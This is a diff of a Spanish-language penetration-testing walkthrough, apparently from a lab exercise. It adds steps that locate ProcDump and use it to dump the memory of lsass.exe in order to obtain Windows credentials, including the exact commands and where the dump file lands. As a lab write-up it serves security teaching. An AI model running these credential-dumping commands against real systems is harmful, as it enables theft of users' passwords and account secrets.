@@ -332,12 +332,43 @@ Necesitamos volcar la memoria de un proceso SYSTEM con `ProcDump` pero para eso,
 <img width="993" height="281" alt="image" src="https://github.com/user-attachments/assets/beddb8fa-2b25-4326-ace2-a391137464b7" />
 
 Buscamos el ejecutable ProcDump mediante el siguiente comando de powershell:
-```
+
+```cmd
 powershell -Command "Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *ProcDump*.exe | Select-Object FullName"
 ```
 
 
 <img width="1025" height="197" alt="imagen" src="https://github.com/user-attachments/assets/30509d31-21f1-4a89-89fb-8dc957ab6bac" />
 
+Obtenemos las siguientes direcciones:
+- C:\Tools\Procdump\procdump.exe
+- C:\Tools\Procdump\procdump64a.exe
+
+Volcamos la memoria del proceso `lsass.exe` utilizando `ProcDump` con el siguiente comando:
+```cmd
+C:\Tools\Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+<img width="1028" height="348" alt="imagen" src="https://github.com/user-attachments/assets/da5c68e1-e765-4762-a4b4-fb99d9da92a2" />
+
+Podría llegar a ser un error de arquitectura, utilizamos el otro ejecutable:
+
+```cmd
+C:\Tools\Procdump\procdump64a.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+<img width="997" height="533" alt="imagen" src="https://github.com/user-attachments/assets/258fd18d-c6f8-4ebe-bdc0-ca4747f236ca" />
+
+
+Procedemos a realizar el volcado de forma manual:
+<img width="1017" height="769" alt="imagen" src="https://github.com/user-attachments/assets/960a869f-c06a-4727-b65d-dfb406f82e93" />
+
+Nos damos cuenta que el volcado había funcionado porque figura como el segundo archivo con el mismo nombre `(2)`.
+
+Obtenemos la dirección `C:\Users\jordan\AppData\Local\Temp\lsass (2).DMP`
+Podríamos haberlo buscado de forma recursiva mediante el siguiente comando:
+```cmd
+powershell -Command "Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *lsass*.dmp | Select-Object FullName"
+```
 
 ---
